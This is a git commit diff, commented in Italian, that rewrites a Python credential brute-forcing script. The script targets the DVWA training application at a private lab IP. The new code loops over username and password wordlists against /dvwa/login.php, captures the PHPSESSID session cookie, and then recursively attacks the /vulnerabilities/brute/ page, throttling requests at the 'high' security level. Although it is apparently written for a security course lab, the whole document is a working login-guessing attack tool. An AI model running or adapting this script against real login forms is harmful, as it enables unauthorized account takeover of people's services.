e73c446b16dcf336cce09299f48820eacbf14d0f
christophercaruso96 <christophercaruso96@outlook.com>
2024-03-21 18:33:49 +0100

    Modificato bruteforce con funzione ricorsiva

--- scripts/bruteForce.py
+++ scripts/bruteForce.py
@@ -1,36 +1,87 @@
-### IMPORT MODULI ESTERNI
+### IMPORT MODULI
 
-#import moduli esterni
-#http.client --> per effettuare connessioni http e ricevere i dati di risposta (header, body etc.)
-#urllib.parse --> importata per definire tramite la funzione urlencode i parametri post per la login
-#ipaddress --> introdotta per la validazione dell'ip
-#os --> check esistenza path inserito
-import http.client, urllib.parse, ipaddress, os
+import requests, ipaddress, os, time
 
+### DICHIARAZIONE FUNZIONI
 
-### DEFINIZIONE FUNZIONI
-
-#funzione per la validazione dell'indirizzo ip inserito
 def is_valid_ip(ip_address):
-    #se l'ip è valido ritorna True
     try:
-        #ip_address riceve in input la stringa dell'ip e se non è valido genera una eccezione
         ipaddress.ip_address(ip_address)
         return True
-    #se entra in exception restituisce false
     except ValueError:
-        #chiedo all'utenet di inserire un IP valido
         print("Inserisci una stringa con indirizzo IP valido (e.g. 192.168.1.6) \n")
         return False
 
+def brute_force(user_list, pwd_list, ip, context, possible_err_msg, security_lev, cookies = None):
+    url_login = "http://" + ip + context
+    error_msg = possible_err_msg
+    for user in user_list:
+        user = user.rstrip()
+        for pwd in pwd_list:
+            pwd = pwd.rstrip()
+            payload_form_login = {'username': user, 'password': pwd, 'Login': 'Login'} 
+            if(cookies == None):
+                 print ("Attacco bruteforce login.php!\n")
+                 print (user, "-", pwd)
+                 sess_id = get_session_id(payload_form_login, url_login)
+                 cookie_session = {'security': security_lev, 'PHPSESSID': sess_id}
+                 check_credentials = check_login_post(payload_form_login, url_login, cookie_session, error_msg)
+                 if(check_credentials == 1):
+                    print("Session ID:", sess_id)
+                    msg_failed_brute = '<pre><br>Username and/or password incorrect.</pre>'
+                    brute_force(user_list, pwd_list, ip, "/dvwa/vulnerabilities/brute/", msg_failed_brute, security_lev, cookie_session)
+                 else:
+                    print("Credenziali non valide!")
+            else:
+                 print ("       Attacco bruteforce context /vulnerabilities/brute/!\n")
+                 print ("       ",user, "-", pwd)
+                 new_check_credentials = check_login_get(payload_form_login, url_login, cookies, error_msg)
+                 if(new_check_credentials == 1):
+                      return 0
+                 if(security_lev == "high"):
+                      time.sleep(4)
 
+def check_login_post(payload, url, cookie, error_msg):
+        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
+        
+        target_page_obj_post = requests.post(url, headers = headers_login, cookies = cookie ,data = payload)
+        if(error_msg in target_page_obj_post.text):
+             print("Login /login.php KO!\n")
+             return 0
+        else:
+             print("Login /login.php OK!\n")
+             return 1
+
+def check_login_get(payload, url, cookie, error_msg):
+        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
+        target_page_obj_get = requests.get(url, headers = headers_login, cookies = cookie , params = payload)
+        if(error_msg in target_page_obj_get.text):
+             print("       Login /dvwa/vulnerabilities/brute/ KO!\n")
+             return 0
+        else:
+            print("        Login /dvwa/vulnerabilities/brute/ OK!\n")
+            return 1
+        
+def get_session_id(payload, url):
+    headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
+    session = requests.Session() 
+    target_page_obj_sess = session.get(url, headers = headers_login, params = payload)
+    phpsessid = target_page_obj_sess.cookies['PHPSESSID']
+    return phpsessid
+  
+        
 ### DICHIARAZIONE VARIABILI E CHECK INPUT UTENTE
 
-#inizializzazione a stringa vuota dell'ip
-ip_target = ""
-path_user = ""
-path_password = ""
+ip_target = "192.168.50.101"
+path_user = "usernames.lst"
+path_password = "passwords.lst"
+security_lev = "low"
+#ip_target = ""
+#path_user = ""
+#path_password = ""
 
+
+'''
 #Input IP target con validazione
 while True:
     #input dall'utente per la stringa ip_target
@@ -47,7 +98,7 @@ while not os.path.isfile(path_user):
 while not os.path.isfile(path_password):
     #input dall'utente per la stringa path_password
     path_password = str(input("Inserisci percorso file passwords:\n"))
-
+'''
 
 ### CORPO PRINCIPALE DEL CODICE
 
@@ -56,39 +107,11 @@ username_file = open(path_user)
 password_file = open(path_password)
 
 #popolate le variabili list che conterranno la lista di user e password tramite funzione readlines
-user_list = username_file.readlines()
-pwd_list = password_file.readlines()
+user_list_login = username_file.readlines()
+pwd_list_login = password_file.readlines()
 
-#iterazione annidata
-#per ogni utente itera su ogni password
-for user in user_list:
-    #pulisco lo username eliminando gli spazi
-    user = user.rstrip()
-    for pwd in pwd_list:
-        #pulisco la password eliminando gli spazi
-        pwd = pwd.rstrip()
-        
-        #stampa user e password del tentativo corrente
-        print (user, "-", pwd)
 
-        #definizione dei parametri da inviare tramite POST con dizionario
-        #l'indice di ogni valore deve corrispondere all' attributo name dell'element html
-        post_parameters_dvwa = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': 'Login'})
-        #costruzione con dizionario di alcuni attributi dell'header che verrà inviato nella POST request
-        headers_dvwa = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
-        
-        #viene stabilita la connessione e inviata la richiesta POST con gli attributi definiti sopra
-        conn = http.client.HTTPConnection(ip_target, 80)
-        conn.request("POST", "/dvwa/login.php", post_parameters_dvwa, headers_dvwa)
-        
-        #catturiamo la risposta del server
-        response = conn.getresponse()
-        
-        #print(response.headers)
-        #print(response.read())
-       
-        #verifica che sia cambiata la location indicata nell'header e se corrisponde a index.php
-        #la login è avvenuta correttamente
-        if(response.getheader('location') == "index.php"):
-            print ("Login effettuata con:", user, " - ", pwd)
-            break
+msg_failed_login = '<div class="message">Login failed</div>'
+
+
+brute_force(user_list_login, pwd_list_login, ip_target, "/dvwa/login.php", msg_failed_login, security_lev)
